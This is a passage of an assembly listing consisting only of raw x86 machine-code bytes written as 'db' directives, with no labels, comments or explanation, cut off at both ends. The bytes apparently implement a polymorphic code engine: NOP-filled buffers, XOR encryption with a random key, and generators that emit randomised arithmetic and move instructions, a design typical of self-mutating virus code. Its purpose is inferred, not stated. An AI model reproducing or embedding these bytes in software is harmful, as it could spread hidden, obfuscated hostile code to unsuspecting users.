db 000h, 0e8h, 0ech, 014h, 000h, 000h, 08dh, 004h, 03eh, 050h, 08bh, 045h, 010h, 083h
db 0c0h, 003h, 053h, 0c1h, 0e8h, 002h, 050h, 06ah, 003h, 0ffh, 075h, 0fch, 0ffh, 075h
db 014h, 0e8h, 063h, 013h, 000h, 000h, 0ffh, 075h, 014h, 089h, 045h, 008h, 0e8h, 040h
db 015h, 000h, 000h, 083h, 0c4h, 02ch, 083h, 07dh, 008h, 000h, 075h, 004h, 033h, 0c0h
db 0ebh, 075h, 08bh, 045h, 0f0h, 003h, 075h, 008h, 02bh, 045h, 008h, 074h, 068h, 089h
db 045h, 008h, 050h, 08dh, 004h, 03eh, 050h, 053h, 0ffh, 075h, 0fch, 0ffh, 075h, 00ch
db 06ah, 000h, 06ah, 007h, 0e8h, 038h, 001h, 000h, 000h, 029h, 045h, 008h, 083h, 065h
db 014h, 000h, 083h, 0c4h, 01ch, 003h, 0f0h, 083h, 07dh, 008h, 000h, 076h, 03eh, 08bh
db 04dh, 008h, 08dh, 004h, 03eh, 02bh, 04dh, 014h, 051h, 050h, 053h, 0ffh, 075h, 0fch
db 0ffh, 075h, 00ch, 06ah, 000h, 06ah, 007h, 0e8h, 00bh, 001h, 000h, 000h, 083h, 0c4h
db 01ch, 085h, 0c0h, 074h, 00bh, 08bh, 04dh, 014h, 003h, 0f0h, 08dh, 044h, 001h, 0ffh
db 0ebh, 008h, 08bh, 045h, 014h, 0c6h, 004h, 03eh, 090h, 046h, 040h, 03bh, 045h, 008h
db 089h, 045h, 014h, 072h, 0c2h, 08bh, 0c6h, 05fh, 05eh, 05bh, 0c9h, 0c3h, 055h, 08bh
db 0ech, 051h, 053h, 056h, 057h, 068h, 000h, 028h, 000h, 000h, 068h, 000h, 004h, 000h
db 000h, 0e8h, 0aah, 033h, 000h, 000h, 08bh, 04dh, 00ch, 089h, 045h, 0fch, 08dh, 05ch
db 008h, 018h, 053h, 06ah, 001h, 0ffh, 015h, 0d4h, 050h, 000h, 000h, 08bh, 0f0h, 083h
db 0c4h, 010h, 085h, 0f6h, 074h, 04bh, 085h, 0dbh, 076h, 017h, 08bh, 0cbh, 0b8h, 090h
db 090h, 090h, 090h, 08bh, 0d1h, 08bh, 0feh, 0c1h, 0e9h, 002h, 0f3h, 0abh, 08bh, 0cah
db 083h, 0e1h, 003h, 0f3h, 0aah, 08bh, 045h, 010h, 068h, 0feh, 0ffh, 0feh, 0ffh, 06ah
db 000h, 089h, 018h, 0e8h, 014h, 033h, 000h, 000h, 050h, 089h, 045h, 010h, 0ffh, 075h
db 00ch, 0ffh, 075h, 0fch, 056h, 0e8h, 088h, 0fch, 0ffh, 0ffh, 083h, 0c4h, 018h, 085h
db 0c0h, 075h, 00ch, 056h, 0ffh, 015h, 0d8h, 050h, 000h, 000h, 059h, 033h, 0c0h, 0ebh
db 04bh, 06ah, 004h, 033h, 0c9h, 05ah, 039h, 055h, 00ch, 072h, 01bh, 08bh, 07dh, 008h
db 083h, 0c2h, 004h, 08bh, 05ch, 017h, 0f8h, 08dh, 03ch, 030h, 033h, 05dh, 010h, 089h
db 01ch, 00fh, 083h, 0c1h, 004h, 03bh, 055h, 00ch, 076h, 0e5h, 03bh, 04dh, 00ch, 073h
db 01fh, 08bh, 0d1h, 08dh, 03ch, 030h, 08bh, 05dh, 008h, 08ah, 01ch, 019h, 088h, 01ch
db 00fh, 041h, 03bh, 04dh, 00ch, 072h, 0f1h, 08bh, 04dh, 010h, 003h, 0d0h, 031h, 00ch
db 032h, 08dh, 004h, 032h, 08bh, 0c6h, 05fh, 05eh, 05bh, 0c9h, 0c3h, 08bh, 044h, 024h
db 008h, 048h, 050h, 06ah, 000h, 0e8h, 094h, 032h, 000h, 000h, 059h, 059h, 0c3h, 055h
db 08bh, 0ech, 08bh, 045h, 008h, 083h, 0f8h, 00ah, 00fh, 087h, 02fh, 001h, 000h, 000h
db 0ffh, 024h, 085h, 049h, 01bh, 000h, 000h, 0ffh, 075h, 020h, 0ffh, 075h, 01ch, 0ffh
db 075h, 018h, 0ffh, 075h, 014h, 0ffh, 075h, 010h, 0ffh, 075h, 00ch, 0e8h, 0c5h, 001h
db 000h, 000h, 083h, 0c4h, 018h, 05dh, 0c3h, 0ffh, 075h, 020h, 0ffh, 075h, 01ch, 0ffh
db 075h, 018h, 0ffh, 075h, 014h, 0ffh, 075h, 010h, 0ffh, 075h, 00ch, 0e8h, 06fh, 001h
db 000h, 000h, 0ebh, 0e2h, 0ffh, 075h, 020h, 0ffh, 075h, 01ch, 0ffh, 075h, 018h, 0ffh
db 075h, 014h, 0ffh, 075h, 010h, 0ffh, 075h, 00ch, 0e8h, 0cah, 001h, 000h, 000h, 0ebh
db 0c9h, 0ffh, 075h, 020h, 0ffh, 075h, 01ch, 0ffh, 075h, 018h, 0ffh, 075h, 014h, 0ffh
db 075h, 010h, 0ffh, 075h, 00ch, 0e8h, 09ch, 003h, 000h, 000h, 0ebh, 0b0h, 0ffh, 075h
db 020h, 0ffh, 075h, 01ch, 0ffh, 075h, 018h, 0ffh, 075h, 014h, 0ffh, 075h, 010h, 0ffh
db 075h, 00ch, 0e8h, 084h, 005h, 000h, 000h, 0ebh, 097h, 0ffh, 075h, 020h, 0ffh, 075h
db 01ch, 0ffh, 075h, 018h, 0ffh, 075h, 014h, 0ffh, 075h, 010h, 0ffh, 075h, 00ch, 0e8h
db 071h, 007h, 000h, 000h, 0e9h, 07bh, 0ffh, 0ffh, 0ffh, 0ffh, 075h, 020h, 0ffh, 075h
db 01ch, 0ffh, 075h, 018h, 0ffh, 075h, 014h, 0ffh, 075h, 010h, 0ffh, 075h, 00ch, 0e8h
db 05bh, 009h, 000h, 000h, 0e9h, 05fh, 0ffh, 0ffh, 0ffh, 0ffh, 075h, 020h, 0ffh, 075h
db 01ch, 0ffh, 075h, 018h, 0ffh, 075h, 014h, 0ffh, 075h, 010h, 0ffh, 075h, 00ch, 0e8h
db 045h, 00bh, 000h, 000h, 0e9h, 043h, 0ffh, 0ffh, 0ffh, 0ffh, 075h, 020h, 0ffh, 075h
db 01ch, 0ffh, 075h, 018h, 0ffh, 075h, 014h, 0ffh, 075h, 010h, 0ffh, 075h, 00ch, 0e8h
db 035h, 00fh, 000h, 000h, 0e9h, 027h, 0ffh, 0ffh, 0ffh, 0ffh, 075h, 020h, 0ffh, 075h
db 01ch, 0ffh, 075h, 018h, 0ffh, 075h, 014h, 0ffh, 075h, 010h, 0ffh, 075h, 00ch, 0e8h
db 051h, 000h, 000h, 000h, 0e9h, 00bh, 0ffh, 0ffh, 0ffh, 0ffh, 075h, 020h, 0ffh, 075h
db 01ch, 0ffh, 075h, 018h, 0ffh, 075h, 014h, 0ffh, 075h, 010h, 0ffh, 075h, 00ch, 0e8h
db 0f7h, 00ch, 000h, 000h, 0e9h, 0efh, 0feh, 0ffh, 0ffh, 033h, 0c0h, 05dh, 0c3h, 052h
db 01ah, 000h, 000h, 06bh, 01ah, 000h, 000h, 0b9h, 01ah, 000h, 000h, 09dh, 01ah, 000h
db 000h, 084h, 01ah, 000h, 000h, 0d5h, 01ah, 000h, 000h, 0f1h, 01ah, 000h, 000h, 00dh
db 01bh, 000h, 000h, 029h, 01bh, 000h, 000h, 01dh, 01ah, 000h, 000h, 039h, 01ah, 000h
db 000h, 055h, 08bh, 0ech, 051h, 083h, 065h, 0fch, 000h, 081h, 07dh, 01ch, 000h, 000h
db 000h, 0f0h, 076h, 004h, 033h, 0c0h, 0c9h, 0c3h, 08bh, 045h, 014h, 068h, 0f7h, 019h
db 000h, 000h, 0ffh, 075h, 018h, 08dh, 04dh, 0fch, 0f7h, 0d0h, 0ffh, 075h, 01ch, 068h
db 0ffh, 0ffh, 0ffh, 07fh, 051h, 050h, 050h, 068h, 0ffh, 0ffh, 01fh, 000h, 0e8h, 06ch
db 030h, 000h, 000h, 050h, 0b8h, 000h, 010h, 000h, 000h, 0ffh, 0d0h, 08bh, 045h, 0fch
db 083h, 0c4h, 024h, 0c9h, 0c3h, 055h, 08bh, 0ech, 08bh, 055h, 01ch, 085h, 0d2h, 075h
db 004h, 033h, 0c0h, 05dh, 0c3h, 08ah, 045h, 00ch, 08bh, 04dh, 018h, 004h, 058h, 04ah
db 06ah, 001h, 088h, 001h, 085h, 0d2h, 058h, 074h, 018h, 041h, 052h, 051h, 0ffh, 075h
db 014h, 0ffh, 075h, 010h, 0ffh, 075h, 00ch, 0ffh, 075h, 008h, 0e8h, 082h, 0ffh, 0ffh
db 0ffh, 083h, 0c4h, 018h, 040h, 05dh, 0c3h, 055h, 08bh, 0ech, 08bh, 055h, 01ch, 085h
db 0d2h, 075h, 004h, 033h, 0c0h, 05dh, 0c3h, 08ah, 045h, 00ch, 08bh, 04dh, 018h, 004h
db 050h, 04ah, 06ah, 001h, 088h, 001h, 085h, 0d2h, 058h, 074h, 018h, 041h, 052h, 051h
db 0ffh, 075h, 014h, 0ffh, 075h, 010h, 0ffh, 075h, 00ch, 0ffh, 075h, 008h, 0e8h, 048h
db 0ffh, 0ffh, 0ffh, 083h, 0c4h, 018h, 040h, 05dh, 0c3h, 055h, 08bh, 0ech, 08bh, 045h
db 008h, 053h, 033h, 0d2h, 056h, 085h, 0c0h, 057h, 00fh, 084h, 0aeh, 001h, 000h, 000h
db 00fh, 086h, 0cbh, 001h, 000h, 000h, 083h, 0f8h, 002h, 00fh, 086h, 0cbh, 000h, 000h
db 000h, 083h, 0f8h, 003h, 00fh, 084h, 0a1h, 000h, 000h, 000h, 083h, 0f8h, 004h, 00fh
db 085h, 0b0h, 001h, 000h, 000h, 08bh, 075h, 018h, 08bh, 045h, 00ch, 06ah, 007h, 05fh
db 0c6h, 006h, 0c7h, 03bh, 0c7h, 076h, 03ch, 06ah, 00ah, 05fh, 039h, 07dh, 01ch, 00fh
db 082h, 094h, 001h, 000h, 000h, 08bh, 05dh, 010h, 0c6h, 046h, 001h, 005h, 089h, 046h
db 002h, 089h, 05eh, 006h, 08bh, 045h, 01ch, 02bh, 0c7h, 050h, 08dh, 004h, 037h, 050h
db 0ffh, 075h, 014h, 053h, 0ffh, 075h, 00ch, 0ffh, 075h, 008h, 0e8h, 0cch, 0feh, 0ffh
db 0ffh, 083h, 0c4h, 018h, 003h, 0c7h, 05fh, 05eh, 05bh, 05dh, 0c3h, 083h, 0f8h, 004h
db 075h, 012h, 039h, 07dh, 01ch, 00fh, 082h, 056h, 001h, 000h, 000h, 088h, 046h, 001h
db 0c6h, 046h, 002h, 024h, 0ebh, 016h, 083h, 0f8h, 005h, 075h, 019h, 039h, 07dh, 01ch
db 00fh, 082h, 03fh, 001h, 000h, 000h, 080h, 066h, 002h, 000h, 0c6h, 046h, 001h, 045h
db 08bh, 05dh, 010h, 089h, 05eh, 003h, 0ebh, 0a8h, 06ah, 006h, 05fh, 039h, 07dh, 01ch
db 00fh, 082h, 023h, 001h, 000h, 000h, 08bh, 05dh, 010h, 088h, 046h, 001h, 089h, 05eh
db 002h, 0ebh, 091h, 06ah, 005h, 05fh, 039h, 07dh, 01ch, 00fh, 082h, 00ch, 001h, 000h
db 000h, 08ah, 045h, 00ch, 08bh, 075h, 018h, 08bh, 05dh, 010h, 02ch, 048h, 088h, 006h
db 089h, 05eh, 001h, 0e9h, 070h, 0ffh, 0ffh, 0ffh, 083h, 07dh, 01ch, 002h, 00fh, 082h
db 0edh, 000h, 000h, 000h, 08bh, 075h, 018h, 083h, 0f8h, 001h, 0c6h, 006h, 089h, 075h
db 003h, 0c6h, 006h, 08bh, 083h, 0f8h, 002h, 075h, 00dh, 08bh, 05dh, 010h, 08bh, 045h
db 00ch, 08bh, 0cbh, 0c1h, 0e1h, 003h, 0ebh, 00dh, 08bh, 045h, 00ch, 08bh, 05dh, 010h
db 08bh, 0c8h, 08bh, 0c3h, 0c1h, 0e1h, 003h, 06ah, 005h, 083h, 0f8h, 007h, 05fh, 076h
db 004h, 08bh, 0c7h, 0ebh, 006h, 06ah, 001h, 05ah, 06ah, 004h, 058h, 00ah, 0c1h, 085h
db 0d2h, 088h, 046h, 001h, 074h, 067h, 0e8h, 0a4h, 02eh, 000h, 000h, 0a8h, 001h, 075h
db 039h, 08bh, 04dh, 00ch, 03bh, 0cfh, 074h, 032h, 083h, 0f9h, 004h, 074h, 02dh, 03bh
db 0dfh, 074h, 029h, 083h, 0fbh, 004h, 074h, 024h, 083h, 07dh, 008h, 001h, 075h, 004h
db 08bh, 0c1h, 0ebh, 008h, 083h, 07dh, 008h, 002h, 08bh, 0c3h, 074h, 002h, 08bh, 0cbh
db 0c0h, 0e0h, 003h, 00ah, 0c1h, 06ah, 002h, 088h, 046h, 001h, 05fh, 0e9h, 0dch, 0feh
db 0ffh, 0ffh, 06ah, 007h, 05fh, 039h, 07dh, 01ch, 072h, 05bh, 080h, 04eh, 001h, 080h
db 083h, 07dh, 008h, 002h, 08bh, 045h, 00ch, 074h, 002h, 08bh, 0c3h, 00ch, 020h, 083h
db 066h, 003h, 000h, 088h, 046h, 002h, 0e9h, 0b7h, 0feh, 0ffh, 0ffh, 06ah, 006h, 05fh
db 039h, 07dh, 01ch, 072h, 036h, 083h, 07dh, 008h, 002h, 08bh, 045h, 00ch, 074h, 002h
db 08bh, 0c3h, 089h, 046h, 002h, 0e9h, 09ch, 0feh, 0ffh, 0ffh, 06ah, 002h, 05fh, 039h
db 07dh, 01ch, 072h, 01bh, 08ah, 045h, 00ch, 08bh, 05dh, 010h, 08bh, 075h, 018h, 00ch
db 0f8h, 0c0h, 0e0h, 003h, 00ah, 0c3h, 0c6h, 006h, 08bh, 088h, 046h, 001h, 0e9h, 079h
db 0feh, 0ffh, 0ffh, 033h, 0c0h, 0e9h, 090h, 0feh, 0ffh, 0ffh, 055h, 08bh, 0ech, 08bh
db 045h, 008h, 033h, 0d2h, 053h, 056h, 03bh, 0c2h, 057h, 00fh, 084h, 0c4h, 001h, 000h
db 000h, 00fh, 086h, 0e1h, 001h, 000h, 000h, 083h, 0f8h, 002h, 00fh, 086h, 0e6h, 000h
db 000h, 000h, 083h, 0f8h, 004h, 00fh, 087h, 0cfh, 001h, 000h, 000h, 08bh, 075h, 018h
db 083h, 0f8h, 003h, 0c6h, 006h, 081h, 075h, 069h, 039h, 055h, 00ch, 075h, 047h, 0e8h
db 0bdh, 02dh, 000h, 000h, 0a8h, 001h, 074h, 006h, 083h, 07dh, 01ch, 006h, 073h, 042h
db 06ah, 005h, 05fh, 039h, 07dh, 01ch, 00fh, 082h, 0a4h, 001h, 000h, 000h, 08bh, 05dh
db 010h, 0c6h, 006h, 005h, 089h, 05eh, 001h, 08bh, 045h, 01ch, 02bh, 0c7h, 050h, 08dh
db 004h, 037h, 050h, 0ffh, 075h, 014h, 053h, 0ffh, 075h, 00ch, 0ffh, 075h, 008h, 0e8h
db 0dfh, 0fch, 0ffh, 0ffh, 083h, 0c4h, 018h, 003h, 0c7h, 05fh, 05eh, 05bh, 05dh, 0c3h
db 083h, 07dh, 01ch, 006h, 00fh, 082h, 06eh, 001h, 000h, 000h, 08ah, 045h, 00ch, 02ch
db 040h, 08bh, 05dh, 010h, 088h, 046h, 001h, 089h, 05eh, 002h, 0e9h, 030h, 001h, 000h
db 000h, 08bh, 045h, 00ch, 06ah, 007h, 05fh, 03bh, 0c7h, 076h, 01bh, 06ah, 00ah, 05fh
db 039h, 07dh, 01ch, 00fh, 082h, 045h, 001h, 000h, 000h, 08bh, 05dh, 010h, 0c6h, 046h
db 001h, 005h, 089h, 046h, 002h, 089h, 05eh, 006h, 0ebh, 09bh, 083h, 0f8h, 004h, 075h
db 012h, 039h, 07dh, 01ch, 00fh, 082h, 028h, 001h, 000h, 000h, 088h, 046h, 001h, 0c6h
db 046h, 002h, 024h, 0ebh, 016h, 083h, 0f8h, 005h, 075h, 01ch, 039h, 07dh, 01ch, 00fh
db 082h, 011h, 001h, 000h, 000h, 080h, 066h, 002h, 000h, 0c6h, 046h, 001h, 045h, 08bh
db 05dh, 010h, 089h, 05eh, 003h, 0e9h, 063h, 0ffh, 0ffh, 0ffh, 083h, 07dh, 01ch, 006h
db 00fh, 082h, 0f4h, 000h, 000h, 000h, 0ebh, 089h, 083h, 07dh, 01ch, 002h, 00fh, 082h
db 0e8h, 000h, 000h, 000h, 08bh, 075h, 018h, 083h, 0f8h, 001h, 0c6h, 006h, 001h, 075h
db 003h, 0c6h, 006h, 003h, 083h, 0f8h, 002h, 075h, 00dh, 08bh, 05dh, 010h, 08bh, 045h
db 00ch, 08bh, 0cbh, 0c1h, 0e1h, 003h, 0ebh, 00dh, 08bh, 045h, 00ch, 08bh, 05dh, 010h
db 08bh, 0c8h, 08bh, 0c3h, 0c1h, 0e1h, 003h, 06ah, 007h, 05fh, 03bh, 0c7h, 076h, 004h
db 06ah, 005h, 0ebh, 005h, 06ah, 001h, 05ah, 06ah, 004h, 058h, 00ah, 0c1h, 085h, 0d2h
db 088h, 046h, 001h, 074h, 062h, 0e8h, 09fh, 02ch, 000h, 000h, 0a8h, 001h, 075h, 037h
db 08bh, 04dh, 00ch, 083h, 0f9h, 005h, 074h, 02fh, 083h, 0f9h, 004h, 074h, 02ah, 083h
db 0fbh, 005h, 074h, 025h, 083h, 0fbh, 004h, 074h, 020h, 083h, 07dh, 008h, 001h, 075h
db 004h, 08bh, 0c1h, 0ebh, 008h, 083h, 07dh, 008h, 002h, 08bh, 0c3h, 074h, 002h, 08bh
db 0cbh, 0c0h, 0e0h, 003h, 00ah, 0c1h, 06ah, 002h, 088h, 046h, 001h, 0ebh, 038h, 039h
db 07dh, 01ch, 072h, 05ch, 080h, 04eh, 001h, 080h, 083h, 07dh, 008h, 002h, 08bh, 045h
db 00ch, 074h, 002h, 08bh, 0c3h, 00ch, 020h, 083h, 066h, 003h, 000h, 088h, 046h, 002h
db 0e9h, 0a4h, 0feh, 0ffh, 0ffh, 083h, 07dh, 01ch, 006h, 072h, 039h, 083h, 07dh, 008h
db 002h, 08bh, 045h, 00ch, 074h, 002h, 08bh, 0c3h, 089h, 046h, 002h, 06ah, 006h, 05fh
db 0e9h, 088h, 0feh, 0ffh, 0ffh, 06ah, 002h, 05fh, 039h, 07dh, 01ch, 072h, 01bh, 08ah
db 045h, 00ch, 08bh, 05dh, 010h, 08bh, 075h, 018h, 00ch, 0f8h, 0c0h, 0e0h, 003h, 00ah
db 0c3h, 0c6h, 006h, 003h, 088h, 046h, 001h, 0e9h, 065h, 0feh, 0ffh, 0ffh, 033h, 0c0h
db 0e9h, 07ch, 0feh, 0ffh, 0ffh, 055h, 08bh, 0ech, 08bh, 045h, 008h, 033h, 0d2h, 053h
db 056h, 03bh, 0c2h, 057h, 00fh, 084h, 0c9h, 001h, 000h, 000h, 00fh, 086h, 0e6h, 001h
db 000h, 000h, 083h, 0f8h, 002h, 00fh, 086h, 0e9h, 000h, 000h, 000h, 083h, 0f8h, 004h
db 00fh, 087h, 0d4h, 001h, 000h, 000h, 08bh, 075h, 018h, 083h, 0f8h, 003h, 0c6h, 006h
db 081h, 075h, 069h, 039h, 055h, 00ch, 075h, 047h, 0e8h, 0bch, 02bh, 000h, 000h, 0a8h
db 001h, 074h, 006h, 083h, 07dh, 01ch, 006h, 073h, 042h, 06ah, 005h, 05fh, 039h, 07dh
db 01ch, 00fh, 082h, 0a9h, 001h, 000h, 000h, 08bh, 05dh, 010h, 0c6h, 006h, 025h, 089h
db 05eh, 001h, 08bh, 045h, 01ch, 02bh, 0c7h, 050h, 08dh, 004h, 037h, 050h, 0ffh, 075h
db 014h, 053h, 0ffh, 075h, 00ch, 0ffh, 075h, 008h, 0e8h, 0deh, 0fah, 0ffh, 0ffh, 083h
db 0c4h, 018h, 003h, 0c7h, 05fh, 05eh, 05bh, 05dh, 0c3h, 083h, 07dh, 01ch, 006h, 00fh
db 082h, 073h, 001h, 000h, 000h, 08ah, 045h, 00ch, 02ch, 020h, 08bh, 05dh, 010h, 088h
db 046h, 001h, 089h, 05eh, 002h, 0e9h, 035h, 001h, 000h, 000h, 08bh, 045h, 00ch, 06ah
db 007h, 05fh, 03bh, 0c7h, 076h, 01bh, 06ah, 00ah, 05fh, 039h, 07dh, 01ch, 00fh, 082h
db 04ah, 001h, 000h, 000h, 08bh, 05dh, 010h, 0c6h, 046h, 001h, 025h, 089h, 046h, 002h
db 089h, 05eh, 006h, 0ebh, 09bh, 083h, 0f8h, 004h, 075h, 013h, 039h, 07dh, 01ch, 00fh
db 082h, 02dh, 001h, 000h, 000h, 0c6h, 046h, 001h, 024h, 0c6h, 046h, 002h, 024h, 0ebh
db 016h, 083h, 0f8h, 005h, 075h, 01ch, 039h, 07dh, 01ch, 00fh, 082h, 015h, 001h, 000h
db 000h, 080h, 066h, 002h, 000h, 0c6h, 046h, 001h, 065h, 08bh, 05dh, 010h, 089h, 05eh
db 003h, 0e9h, 062h, 0ffh, 0ffh, 0ffh, 083h, 07dh, 01ch, 006h, 00fh, 082h, 0f8h, 000h
db 000h, 000h, 004h, 020h, 0ebh, 086h, 083h, 07dh, 01ch, 002h, 00fh, 082h, 0eah, 000h
db 000h, 000h, 08bh, 075h, 018h, 083h, 0f8h, 001h, 0c6h, 006h, 021h, 075h, 003h, 0c6h
db 006h, 023h, 083h, 0f8h, 002h, 075h, 00dh, 08bh, 05dh, 010h, 08bh, 045h, 00ch, 08bh
db 0cbh, 0c1h, 0e1h, 003h, 0ebh, 00dh, 08bh, 045h, 00ch, 08bh, 05dh, 010h, 08bh, 0c8h
db 08bh, 0c3h, 0c1h, 0e1h, 003h, 06ah, 005h, 083h, 0f8h, 007h, 05fh, 076h, 004h, 08bh
db 0c7h, 0ebh, 006h, 06ah, 001h, 05ah, 06ah, 004h, 058h, 00ah, 0c1h, 085h, 0d2h, 088h
db 046h, 001h, 074h, 063h, 0e8h, 09ah, 02ah, 000h, 000h, 0a8h, 001h, 075h, 035h, 08bh
db 04dh, 00ch, 03bh, 0cfh, 074h, 02eh, 083h, 0f9h, 004h, 074h, 029h, 03bh, 0dfh, 074h
db 025h, 083h, 0fbh, 004h, 074h, 020h, 083h, 07dh, 008h, 001h, 075h, 004h, 08bh, 0c1h
db 0ebh, 008h, 083h, 07dh, 008h, 002h, 08bh, 0c3h, 074h, 002h, 08bh, 0cbh, 0c0h, 0e0h
db 003h, 00ah, 0c1h, 06ah, 002h, 088h, 046h, 001h, 0ebh, 03bh, 06ah, 007h, 05fh, 039h
db 07dh, 01ch, 072h, 05ch, 080h, 04eh, 001h, 080h, 083h, 07dh, 008h, 002h, 08bh, 045h
db 00ch, 074h, 002h, 08bh, 0c3h, 00ch, 020h, 083h, 066h, 003h, 000h, 088h, 046h, 002h
db 0e9h, 09fh, 0feh, 0ffh, 0ffh, 083h, 07dh, 01ch, 006h, 072h, 039h, 083h, 07dh, 008h
db 002h, 08bh, 045h, 00ch, 074h, 002h, 08bh, 0c3h, 089h, 046h, 002h, 06ah, 006h, 05fh
db 0e9h, 083h, 0feh, 0ffh, 0ffh, 06ah, 002h, 05fh, 039h, 07dh, 01ch, 072h, 01bh, 08ah
db 045h, 00ch, 08bh, 05dh, 010h, 08bh, 075h, 018h, 00ch, 0f8h, 0c0h, 0e0h, 003h, 00ah
db 0c3h, 0c6h, 006h, 023h, 088h, 046h, 001h, 0e9h, 060h, 0feh, 0ffh, 0ffh, 033h, 0c0h
db 0e9h, 077h, 0feh, 0ffh, 0ffh, 055h, 08bh, 0ech, 08bh, 045h, 008h, 033h, 0d2h, 053h
db 056h, 03bh, 0c2h, 057h, 00fh, 084h, 0c9h, 001h, 000h, 000h, 00fh, 086h, 0e6h, 001h
db 000h, 000h, 083h, 0f8h, 002h, 00fh, 086h, 0e9h, 000h, 000h, 000h, 083h, 0f8h, 004h
db 00fh, 087h, 0d4h, 001h, 000h, 000h, 08bh, 075h, 018h, 083h, 0f8h, 003h, 0c6h, 006h
db 081h, 075h, 069h, 039h, 055h, 00ch, 075h, 047h, 0e8h, 0b6h, 029h, 000h, 000h, 0a8h
db 001h, 074h, 006h, 083h, 07dh, 01ch, 006h, 073h, 042h, 06ah, 005h, 05fh, 039h, 07dh
db 01ch, 00fh, 082h, 0a9h, 001h, 000h, 000h, 08bh, 05dh, 010h, 0c6h, 006h, 00dh, 089h
db 05eh, 001h, 08bh, 045h, 01ch, 02bh, 0c7h, 050h, 08dh, 004h, 037h, 050h, 0ffh, 075h
db 014h, 053h, 0ffh, 075h, 00ch, 0ffh, 075h, 008h, 0e8h, 0d8h, 0f8h, 0ffh, 0ffh, 083h
db 0c4h, 018h, 003h, 0c7h, 05fh, 05eh, 05bh, 05dh, 0c3h, 083h, 07dh, 01ch, 006h, 00fh
db 082h, 073h, 001h, 000h, 000h, 08ah, 045h, 00ch, 02ch, 038h, 08bh, 05dh, 010h, 088h
db 046h, 001h, 089h, 05eh, 002h, 0e9h, 035h, 001h, 000h, 000h, 08bh, 045h, 00ch, 06ah
db 007h, 05fh, 03bh, 0c7h, 076h, 01bh, 06ah, 00ah, 05fh, 039h, 07dh, 01ch, 00fh, 082h
db 04ah, 001h, 000h, 000h, 08bh, 05dh, 010h, 0c6h, 046h, 001h, 00dh, 089h, 046h, 002h
db 089h, 05eh, 006h, 0ebh, 09bh, 083h, 0f8h, 004h, 075h, 013h, 039h, 07dh, 01ch, 00fh
db 082h, 02dh, 001h, 000h, 000h, 0c6h, 046h, 001h, 00ch, 0c6h, 046h, 002h, 024h, 0ebh
db 016h, 083h, 0f8h, 005h, 075h, 01ch, 039h, 07dh, 01ch, 00fh, 082h, 015h, 001h, 000h
db 000h, 080h, 066h, 002h, 000h, 0c6h, 046h, 001h, 04dh, 08bh, 05dh, 010h, 089h, 05eh
db 003h, 0e9h, 062h, 0ffh, 0ffh, 0ffh, 083h, 07dh, 01ch, 006h, 00fh, 082h, 0f8h, 000h
db 000h, 000h, 004h, 008h, 0ebh, 086h, 083h, 07dh, 01ch, 002h, 00fh, 082h, 0eah, 000h
db 000h, 000h, 08bh, 075h, 018h, 083h, 0f8h, 001h, 0c6h, 006h, 009h, 075h, 003h, 0c6h
db 006h, 00bh, 083h, 0f8h, 002h, 075h, 00dh, 08bh, 05dh, 010h, 08bh, 045h, 00ch, 08bh
db 0cbh, 0c1h, 0e1h, 003h, 0ebh, 00dh, 08bh, 045h, 00ch, 08bh, 05dh, 010h, 08bh, 0c8h
db 08bh, 0c3h, 0c1h, 0e1h, 003h, 06ah, 005h, 083h, 0f8h, 007h, 05fh, 076h, 004h, 08bh
db 0c7h, 0ebh, 006h, 06ah, 001h, 05ah, 06ah, 004h, 058h, 00ah, 0c1h, 085h, 0d2h, 088h
db 046h, 001h, 074h, 063h, 0e8h, 094h, 028h, 000h, 000h, 0a8h, 001h, 075h, 035h, 08bh
db 04dh, 00ch, 03bh, 0cfh, 074h, 02eh, 083h, 0f9h, 004h, 074h, 029h, 03bh, 0dfh, 074h
db 025h, 083h, 0fbh, 004h, 074h, 020h, 083h, 07dh, 008h, 001h, 075h, 004h, 08bh, 0c1h
db 0ebh, 008h, 083h, 07dh, 008h, 002h, 08bh, 0c3h, 074h, 002h, 08bh, 0cbh, 0c0h, 0e0h
db 003h, 00ah, 0c1h, 06ah, 002h, 088h, 046h, 001h, 0ebh, 03bh, 06ah, 007h, 05fh, 039h
db 07dh, 01ch, 072h, 05ch, 080h, 04eh, 001h, 080h, 083h, 07dh, 008h, 002h, 08bh, 045h
db 00ch, 074h, 002h, 08bh, 0c3h, 00ch, 020h, 083h, 066h, 003h, 000h, 088h, 046h, 002h
db 0e9h, 09fh, 0feh, 0ffh, 0ffh, 083h, 07dh, 01ch, 006h, 072h, 039h, 083h, 07dh, 008h
db 002h, 08bh, 045h, 00ch, 074h, 002h, 08bh, 0c3h, 089h, 046h, 002h, 06ah, 006h, 05fh
db 0e9h, 083h, 0feh, 0ffh, 0ffh, 06ah, 002h, 05fh, 039h, 07dh, 01ch, 072h, 01bh, 08ah
db 045h, 00ch, 08bh, 05dh, 010h, 08bh, 075h, 018h, 00ch, 0f8h, 0c0h, 0e0h, 003h, 00ah
db 0c3h, 0c6h, 006h, 00bh, 088h, 046h, 001h, 0e9h, 060h, 0feh, 0ffh, 0ffh, 033h, 0c0h
db 0e9h, 077h, 0feh, 0ffh, 0ffh, 055h, 08bh, 0ech, 08bh, 045h, 008h, 033h, 0d2h, 053h
db 056h, 03bh, 0c2h, 057h, 00fh, 084h, 0c9h, 001h, 000h, 000h, 00fh, 086h, 0e6h, 001h
db 000h, 000h, 083h, 0f8h, 002h, 00fh, 086h, 0e9h, 000h, 000h, 000h, 083h, 0f8h, 004h
db 00fh, 087h, 0d4h, 001h, 000h, 000h, 08bh, 075h, 018h, 083h, 0f8h, 003h, 0c6h, 006h
db 081h, 075h, 069h, 039h, 055h, 00ch, 075h, 047h, 0e8h, 0b0h, 027h, 000h, 000h, 0a8h
db 001h, 074h, 006h, 083h, 07dh, 01ch, 006h, 073h, 042h, 06ah, 005h, 05fh, 039h, 07dh
db 01ch, 00fh, 082h, 0a9h, 001h, 000h, 000h, 08bh, 05dh, 010h, 0c6h, 006h, 02dh, 089h
db 05eh, 001h, 08bh, 045h, 01ch, 02bh, 0c7h, 050h, 08dh, 004h, 037h, 050h, 0ffh, 075h
db 014h, 053h, 0ffh, 075h, 00ch, 0ffh, 075h, 008h, 0e8h, 0d2h, 0f6h, 0ffh, 0ffh, 083h
db 0c4h, 018h, 003h, 0c7h, 05fh, 05eh, 05bh, 05dh, 0c3h, 083h, 07dh, 01ch, 006h, 00fh
db 082h, 073h, 001h, 000h, 000h, 08ah, 045h, 00ch, 02ch, 018h, 08bh, 05dh, 010h, 088h
db 046h, 001h, 089h, 05eh, 002h, 0e9h, 035h, 001h, 000h, 000h, 08bh, 045h, 00ch, 06ah
